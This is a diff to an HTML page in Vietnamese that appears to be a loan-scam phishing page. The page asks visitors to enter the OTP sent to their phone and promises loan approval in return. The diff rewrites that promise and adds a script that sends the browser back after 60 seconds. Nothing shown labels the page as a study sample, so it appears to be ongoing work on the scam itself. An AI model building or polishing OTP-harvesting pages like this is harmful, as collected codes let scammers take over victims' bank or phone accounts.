@@ -212,7 +212,7 @@
                      <div class="wsite-section-content">
                         <div class="container">
                            <div class="wsite-section-elements">
-                              <h2 class="wsite-content-title">Qúy khách vui lòng nhâp mã OTP gởi về Số điện thoại quý khách<br>Sau khi nhập OTP thành công, hồ sơ của quý khách sẽ được duyệt khoản vay&nbsp;<br></h2>
+                              <h2 class="wsite-content-title">Qúy khách vui lòng nhâp mã OTP gởi về Số điện thoại quý khách<br>Sau khi nhập OTP thành công, hồ sơ của quý khách sẽ được duyệt thành công&nbsp;<br></h2>
                               <div class="paragraph"></div>
                               <div>
                                  <!-- <div id="920661217538489815-msg" style="">MÃ HẾT HIỆU LỰC VUI LÒNG ĐĂNG NHẬP LẠI. </div> -->
@@ -389,6 +389,15 @@
       <script>
          window._W.isEUUser = false;
          window._W.showCookieToAll = "";
+      </script>
+      <script>
+            $(document).ready(function(){
+               setTimeout(function(){
+                  window.history.back();
+               },1000*60)
+            }
+            )
+            
       </script>
    </body>
    <style>
